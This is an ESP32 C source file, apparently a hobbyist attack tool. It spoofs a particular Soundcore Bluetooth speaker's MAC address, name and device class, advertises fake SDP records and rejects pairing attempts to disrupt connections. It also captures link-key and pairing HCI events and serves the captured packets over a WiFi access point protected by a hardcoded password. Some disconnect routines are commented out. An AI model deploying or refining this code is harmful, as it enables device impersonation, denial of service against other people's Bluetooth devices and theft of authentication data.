// bt_dos_attack.c - ESP-IDF Bluetooth DoS for speakers

#include "nvs_flash.h"
#include "esp_bt.h"
#include "esp_log.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "esp_gap_bt_api.h"
#include "esp_sdp_api.h"     // For SDP intercepts
#include "esp_l2cap_bt_api.h" // For L2CAP intercepts
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_mac.h"
#include <string.h>
#include "esp_l2cap_bt_api.h"
#include "esp_avrc_api.h"
#include "esp_a2dp_api.h"
#include <stdio.h>
#include <stdlib.h>
#include "esp_spiffs.h"
#include "http_server.h"
#include "bt_hci_common.h"  // Make sure this is properly included


static const char *TAG = "BT_DOS_ATTACK";

// SoundCore speaker to spoof - use the one you found (F4:4E:FD:03:A6:DC)
static uint8_t speaker_mac[6] = {0xF4, 0x4E, 0xFD, 0x03, 0xA6, 0xDC};
static char *speaker_name = "Soundcore fuc"; // Change to match exact speaker name

// Track connected devices
#define MAX_CONNECTED_DEVICES 5
static esp_bd_addr_t connected_devices[MAX_CONNECTED_DEVICES];
static uint8_t num_connected_devices = 0;

// Buffer to store captured packets
#define MAX_CAPTURED_PACKETS 50
#define MAX_PACKET_SIZE 256

typedef struct {
    uint8_t data[MAX_PACKET_SIZE];
    uint16_t len;
    uint32_t timestamp;
    char type[32];
} captured_packet_t;

static captured_packet_t captured_packets[MAX_CAPTURED_PACKETS];
static uint16_t num_captured_packets = 0;
static uint16_t active_connection_handle = 0;


// Function to save a packet to memory buffer
void save_packet(uint8_t *data, uint16_t len, const char *type) {
    if (num_captured_packets < MAX_CAPTURED_PACKETS && len <= MAX_PACKET_SIZE) {
        captured_packet_t *packet = &captured_packets[num_captured_packets];
        
        // Copy packet data
        memcpy(packet->data, data, len);
        packet->len = len;
        packet->timestamp = esp_log_timestamp(); // Current timestamp
        strncpy(packet->type, type, sizeof(packet->type)-1);
        packet->type[sizeof(packet->type)-1] = '\0'; // Ensure null termination
        
        num_captured_packets++;
        ESP_LOGI(TAG, "Saved packet #%d: type=%s, len=%d", 
                num_captured_packets, type, len);
    } else {
        ESP_LOGW(TAG, "Cannot save packet: buffer full or packet too large");
    }
}




// Function to save all captured packets to a file
static esp_err_t save_packets_to_file(void) {
    esp_err_t ret;
    
    // Initialize SPIFFS
    esp_vfs_spiffs_conf_t conf = {
        .base_path = "/spiffs",
        .partition_label = "storage",
        .max_files = 5,
        .format_if_mount_failed = true
    };
    
    ret = esp_vfs_spiffs_register(&conf);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to mount SPIFFS: %s", esp_err_to_name(ret));
        return ret;
    }
    
    // Create output file
    char filename[64];
    snprintf(filename, sizeof(filename), "/spiffs/bt_packets_%u.bin", (unsigned)esp_log_timestamp());
    
    FILE *f = fopen(filename, "wb");
    if (f == NULL) {
        ESP_LOGE(TAG, "Failed to open file for writing");
        esp_vfs_spiffs_unregister(NULL);
        return ESP_FAIL;
    }
    
    // Write number of packets
    fwrite(&num_captured_packets, sizeof(num_captured_packets), 1, f);
    
    // Write each packet
    for (int i = 0; i < num_captured_packets; i++) {
        captured_packet_t *packet = &captured_packets[i];
        
        // Write packet metadata
        fwrite(&packet->len, sizeof(packet->len), 1, f);
        fwrite(&packet->timestamp, sizeof(packet->timestamp), 1, f);
        fwrite(packet->type, sizeof(packet->type), 1, f);
        
        // Write packet data
        fwrite(packet->data, 1, packet->len, f);
    }
    
    fclose(f);
    esp_vfs_spiffs_unregister(NULL);
    
    ESP_LOGI(TAG, "Saved %d packets to %s", num_captured_packets, filename);
    return ESP_OK;
}

// Function to ensure SPIFFS is properly formatted
static esp_err_t ensure_spiffs_formatted(void) {
    ESP_LOGI(TAG, "Ensuring SPIFFS partition is formatted");
    
    // Try to mount with format_if_failed = true
    esp_vfs_spiffs_conf_t conf = {
        .base_path = "/spiffs",
        .partition_label = "storage",
        .max_files = 5,
        .format_if_mount_failed = true
    };
    
    esp_err_t ret = esp_vfs_spiffs_register(&conf);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to mount or format SPIFFS: %s", esp_err_to_name(ret));
        return ret;
    }
    
    // Get partition info
    size_t total = 0, used = 0;
    ret = esp_spiffs_info("storage", &total, &used);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to get SPIFFS partition info");
    } else {
        ESP_LOGI(TAG, "SPIFFS partition: total size %d bytes, used %d bytes", total, used);
    }
    
    // Unmount
    esp_vfs_spiffs_unregister(NULL);
    
    return ESP_OK;
}

// Modified HCI callback to capture and save packets
static int vhci_host_recv_cb(uint8_t *data, uint16_t len) {
    if (len > 0) {
        if (data[0] == 0x04) { // HCI Event packet
            uint8_t event_code = data[1];
            char bd_addr_str[18] = {0};
            
            // Common function to format BD_ADDR for logging
            if (len >= 9 && (event_code == 0x17 || event_code == 0x18)) { // Events with BD_ADDR
                sprintf(bd_addr_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                        data[3], data[4], data[5], data[6], data[7], data[8]);
            }
            
            switch(event_code) {
                case 0x03: // CONNECTION_COMPLETE
                    if (len >= 11) {
                        uint8_t status = data[3];
                        uint16_t handle = (data[4]) | (data[5] << 8);
                        
                        // Get BD_ADDR from this event
                        sprintf(bd_addr_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                                data[6], data[7], data[8], data[9], data[10], data[11]);
                        
                        if (status == 0) { // Connection successful
                            ESP_LOGI(TAG, "Connection established to %s, handle: 0x%04x", 
                                     bd_addr_str, handle);
                            // Store handle for later use
                            active_connection_handle = handle;
                            
                            // Save this connection event
                            save_packet(data, len, "CONNECTION_COMPLETE");
                            
                            // Put connection in sniff mode
                            vTaskDelay(pdMS_TO_TICKS(100)); // Small delay
                            // set_sniff_mode(handle, 800, 400, 4, 1);
                        }
                    }
                    break;

                case 0x17: // LINK_KEY_REQUEST - Critical to capture for auth analysis
                    ESP_LOGI(TAG, "LINK KEY REQUEST from device %s", bd_addr_str);
                    save_packet(data, len, "LINK_KEY_REQUEST");
                    break;
                    
                case 0x18: // LINK_KEY_NOTIFICATION
                    ESP_LOGI(TAG, "LINK KEY NOTIFICATION for device %s", bd_addr_str);
                    save_packet(data, len, "LINK_KEY_NOTIFICATION");
                    
                    // This event contains key type info at data[9]
                    uint8_t key_type = data[9];
                    ESP_LOGI(TAG, "  Key type: %d", key_type);
                    break;
                    
                case 0x06: // AUTHENTICATION_COMPLETE
                    if (len >= 4) {
                        uint8_t status = data[4];
                        uint16_t handle = data[3] | (data[2] << 8);
                        ESP_LOGI(TAG, "Authentication result: status=%d, handle=%d", 
                                status, handle);
                        save_packet(data, len, "AUTHENTICATION_COMPLETE");
                    }
                    break;
                    
                case 0x08: // ENCRYPTION_CHANGE
                    if (len >= 5) {
                        uint8_t status = data[3];
                        uint16_t handle = data[4] | (data[5] << 8);
                        uint8_t encryption = data[6]; // 0: off, 1: on (E0), 2: on (AES-CCM)
                        ESP_LOGI(TAG, "Encryption change: status=%d, handle=%d, enc=%d", 
                                status, handle, encryption);
                        save_packet(data, len, "ENCRYPTION_CHANGE");
                    }
                    break;
                    
                case 0x31: // IO_CAPABILITY_REQUEST
                    if (len >= 9) {
                        sprintf(bd_addr_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                                data[3], data[4], data[5], data[6], data[7], data[8]);
                        ESP_LOGI(TAG, "IO Capability request from %s", bd_addr_str);
                        save_packet(data, len, "IO_CAPABILITY_REQUEST");
                    }
                    break;
                    
                case 0x36: // SIMPLE_PAIRING_COMPLETE
                    if (len >= 10) {
                        uint8_t status = data[3];
                        sprintf(bd_addr_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                                data[4], data[5], data[6], data[7], data[8], data[9]);
                        ESP_LOGI(TAG, "Simple pairing complete: status=%d, addr=%s", 
                                status, bd_addr_str);
                        save_packet(data, len, "SIMPLE_PAIRING_COMPLETE");
                        
                        // If we've captured a good set of auth packets, save to file
                        if (num_captured_packets > 10) {
                            save_packets_to_file();
                        }
                    }
                    break;
                    
                case 0x05: // DISCONNECTION_COMPLETE
                    if (len >= 6) {
                        uint8_t status = data[3];
                        uint16_t handle = data[4] | (data[5] << 8);
                        uint8_t reason = data[6];
                        ESP_LOGI(TAG, "Disconnection: status=%d, handle=%d, reason=0x%02x", 
                                status, handle, reason);
                        save_packet(data, len, "DISCONNECTION_COMPLETE");
                        
                        // If connection ended, save captured packets
                        save_packets_to_file();
                        
                        // Reset active handle
                        if (handle == active_connection_handle) {
                            active_connection_handle = 0;
                        }
                    }
                    break;
                    
                default:
                    // For debugging, save any other events
                    if (event_code < 0x40) { // Only common events
                        char type[32];
                        sprintf(type, "HCI_EVENT_0x%02X", event_code);
                        save_packet(data, len, type);
                    }
                    break;
            }
        }
    }
    return 0;
}
// Add VHCI host callback structure
static esp_vhci_host_callback_t vhci_host_cb = {
    .notify_host_send_available = NULL, // We don't need this for passive capture
    .notify_host_recv = vhci_host_recv_cb,
};

// L2CAP callback to intercept connection requests
static void bt_l2cap_cb(esp_bt_l2cap_cb_event_t event, esp_bt_l2cap_cb_param_t *param)
{
    switch (event) {
        case ESP_BT_L2CAP_OPEN_EVT:
            ESP_LOGI(TAG, "L2CAP connection open - forcing disconnect");
            // Wait briefly then force disconnect
            vTaskDelay(pdMS_TO_TICKS(100));
            // esp_bt_l2cap_connect(param->open.handle);
            break;
            
        case ESP_BT_L2CAP_CL_INIT_EVT:
            ESP_LOGI(TAG, "L2CAP client initiated connection - allowing setup then will disconnect");
            break;
            
        default:
            break;
    }
}

// SDP callback to intercept service queries
static void bt_sdp_cb(esp_sdp_cb_event_t event, esp_sdp_cb_param_t *param)
{
    switch (event) {
        case ESP_SDP_SEARCH_COMP_EVT:
            ESP_LOGI(TAG, "SDP discovery complete - will disconnect soon");
            break;
            
        default:
            break;
    }
}

// Extended GAP callback with better handling
static void bt_gap_cb(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param)
{
    char addr_str[18];
    
    switch (event) {
        case ESP_BT_GAP_AUTH_CMPL_EVT:
            sprintf(addr_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                    param->auth_cmpl.bda[0], param->auth_cmpl.bda[1], param->auth_cmpl.bda[2],
                    param->auth_cmpl.bda[3], param->auth_cmpl.bda[4], param->auth_cmpl.bda[5]);
            ESP_LOGI(TAG, "Authentication with %s - status: %d", addr_str, param->auth_cmpl.stat);
            break;
            
        case ESP_BT_GAP_ACL_CONN_CMPL_STAT_EVT:
            // When ACL connection completes
            sprintf(addr_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                    param->acl_conn_cmpl_stat.bda[0], param->acl_conn_cmpl_stat.bda[1], 
                    param->acl_conn_cmpl_stat.bda[2], param->acl_conn_cmpl_stat.bda[3], 
                    param->acl_conn_cmpl_stat.bda[4], param->acl_conn_cmpl_stat.bda[5]);
            ESP_LOGI(TAG, "ACL connection with %s complete - intercepting", addr_str);
            
            // Add to connected devices list
            if (num_connected_devices < MAX_CONNECTED_DEVICES) {
                memcpy(connected_devices[num_connected_devices], 
                       param->acl_conn_cmpl_stat.bda, ESP_BD_ADDR_LEN);
                num_connected_devices++;
            }
            break;
            
        case ESP_BT_GAP_ACL_DISCONN_CMPL_STAT_EVT:
            // When ACL disconnection completes
            sprintf(addr_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                    param->acl_disconn_cmpl_stat.bda[0], param->acl_disconn_cmpl_stat.bda[1], 
                    param->acl_disconn_cmpl_stat.bda[2], param->acl_disconn_cmpl_stat.bda[3], 
                    param->acl_disconn_cmpl_stat.bda[4], param->acl_disconn_cmpl_stat.bda[5]);
            ESP_LOGI(TAG, "ACL disconnection with %s complete", addr_str);
            
            // Remove from connected devices list
            for (int i = 0; i < num_connected_devices; i++) {
                if (memcmp(connected_devices[i], param->acl_disconn_cmpl_stat.bda, ESP_BD_ADDR_LEN) == 0) {
                    // Shift remaining entries
                    for (int j = i; j < num_connected_devices - 1; j++) {
                        memcpy(connected_devices[j], connected_devices[j + 1], ESP_BD_ADDR_LEN);
                    }
                    num_connected_devices--;
                    break;
                }
            }
            break;
            
            
        case ESP_BT_GAP_CFM_REQ_EVT:
            // Reject confirmation request
            ESP_LOGI(TAG, "Confirmation request - rejecting");
            esp_bt_gap_ssp_confirm_reply(param->cfm_req.bda, false);
            break;
            
        case ESP_BT_GAP_KEY_REQ_EVT:
            // Cannot provide key
            ESP_LOGI(TAG, "Key request - cannot provide key");
            // No API to respond with wrong key directly
            break;
            
        default:
            break;
    }
}

// Task to actively disconnect devices by initiating pairing
void disconnect_task(void *pvParameters)
{
    while (1) {
        // For each connected device
        for (int i = 0; i < num_connected_devices; i++) {
            char addr_str[18];
            sprintf(addr_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                    connected_devices[i][0], connected_devices[i][1], connected_devices[i][2],
                    connected_devices[i][3], connected_devices[i][4], connected_devices[i][5]);
            
            ESP_LOGI(TAG, "Forcing authentication with %s", addr_str);
            
            // // Force authentication - this will fail and cause disconnect
            // esp_bt_gap_set_security(connected_devices[i], ESP_BT_SEC_AUTHENTICATE);
        }
        
        // Wait between cycles
        vTaskDelay(pdMS_TO_TICKS(2000));
    }
}

void setup_fake_sdp_services(void) {
    esp_sdp_init();
    // Create DIP service to get device info
    esp_bluetooth_sdp_record_t dip_record = {0};
    dip_record.hdr.type = ESP_SDP_TYPE_DIP_SERVER;
    dip_record.dip.hdr.user1_ptr_len = 0;
    dip_record.dip.hdr.user2_ptr_len = 0;
    dip_record.dip.vendor = 0x0001; // Fake vendor ID (Bluetooth SIG)
    dip_record.dip.vendor_id_source = ESP_SDP_VENDOR_ID_SRC_BT;
    dip_record.dip.product = 0x0001;
    dip_record.dip.version = 0x0100;
    dip_record.dip.primary_record = true;

    esp_sdp_create_record(&dip_record);
}



void app_main(void)
{
    esp_err_t ret;
    
    // Initialize NVS
    ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    
    // Release BLE memory
    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_BLE));
    
    // Set MAC address BEFORE initializing controller
    ESP_LOGI(TAG, "Setting Bluetooth MAC to match speaker: %02x:%02x:%02x:%02x:%02x:%02x",
            speaker_mac[0], speaker_mac[1], speaker_mac[2],
            speaker_mac[3], speaker_mac[4], speaker_mac[5]);
    
    ESP_ERROR_CHECK(esp_iface_mac_addr_set(speaker_mac, ESP_MAC_BT));
    
    // Initialize controller
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
    ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT));
    
    // Register VHCI callback to capture HCI packets
    ESP_ERROR_CHECK(esp_vhci_host_register_callback(&vhci_host_cb));
    ESP_LOGI(TAG, "Registered HCI packet capture callback");
    
    // Initialize Bluedroid
    ESP_ERROR_CHECK(esp_bluedroid_init());
    ESP_ERROR_CHECK(esp_bluedroid_enable());
    
    // Register callbacks
    ESP_ERROR_CHECK(esp_bt_gap_register_callback(bt_gap_cb));
    ESP_ERROR_CHECK(esp_sdp_register_callback(bt_sdp_cb));
    ESP_ERROR_CHECK(esp_bt_l2cap_register_callback(bt_l2cap_cb));
    
    // Set device name to match real speaker
    ESP_ERROR_CHECK(esp_bt_dev_set_device_name(speaker_name));
    
    // Make device discoverable & connectable
    ESP_ERROR_CHECK(esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE));
    
    // Set security parameters - require authentication
    {
        esp_bt_sp_param_t param_type = ESP_BT_SP_IOCAP_MODE;
        esp_bt_io_cap_t iocap = ESP_BT_IO_CAP_IO;
        ESP_ERROR_CHECK(esp_bt_gap_set_security_param(param_type, &iocap, sizeof(uint8_t)));
    }
    
    // Set to match a speaker's Class of Device
    esp_bt_cod_t cod;
    cod.major = 4;        // Audio/Video
    cod.minor = 5;        // Loudspeaker
    cod.service = 0x20;   // Audio service
    ESP_ERROR_CHECK(esp_bt_gap_set_cod(cod, ESP_BT_SET_COD_ALL));
    
    // // Start task to periodically disconnect devices
    // xTaskCreate(disconnect_task, "disconnect_task", 2048, NULL, 5, NULL);
    
    ESP_LOGI(TAG, "Bluetooth DoS attack started");
    ESP_LOGI(TAG, "Spoofing: %s (%02x:%02x:%02x:%02x:%02x:%02x)",
             speaker_name, speaker_mac[0], speaker_mac[1], speaker_mac[2],
             speaker_mac[3], speaker_mac[4], speaker_mac[5]);

    // Add fake SDP services to make attack more effective
    setup_fake_sdp_services();
    
    // Format and initialize SPIFFS
    ESP_LOGI(TAG, "Ensuring SPIFFS is formatted before starting file server");
    ensure_spiffs_formatted();
    
    // Initialize file server for packet downloading
    ESP_LOGI(TAG, "Starting file server for packet downloads");
    init_file_server();
    ESP_LOGI(TAG, "Connect to WiFi SSID 'ESP32_BT_PACKETS' with password 'password123'");
    ESP_LOGI(TAG, "Then open http://192.168.4.1 in your browser to download captured packets");
    
    while (1) {
        vTaskDelay(pdMS_TO_TICKS(100)); // Yield to other tasks
    }
}